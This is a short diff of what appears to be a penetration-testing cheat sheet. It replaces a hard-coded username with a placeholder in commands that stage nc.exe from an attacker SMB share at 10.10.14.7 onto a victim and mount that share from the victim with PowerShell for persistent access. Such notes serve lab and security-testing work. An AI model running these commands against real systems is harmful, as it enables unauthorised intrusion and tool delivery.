@@ -1087,14 +1087,14 @@ copy \\10.10.14.7\share\nc.exe c:\windows\temp
 - We can also set up the drive in a way that our victim has more persistent access to save constant uploading from webserver
 
 ```
-smbserver.py <SMBDRIVENAME> $pwd -smb2support -user techflow -password <password>
+smbserver.py <SMBDRIVENAME> $pwd -smb2support -user <user> -password <password>
 ```
 
 - On victim run
 ```
 $pass = convertto-securestring '<password>' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential('techflow',$pass)
-New-PSDrive -Name techflow -PSProvider FileSystem -Credential $cred -Root <LOCAL>\<SMBDRIVENAME>
+$cred = New-Object System.Management.Automation.PSCredential('<user>',$pass)
+New-PSDrive -Name <user> -PSProvider FileSystem -Credential $cred -Root <LOCAL>\<SMBDRIVENAME>
 ```
 -Now we can access with
 ```
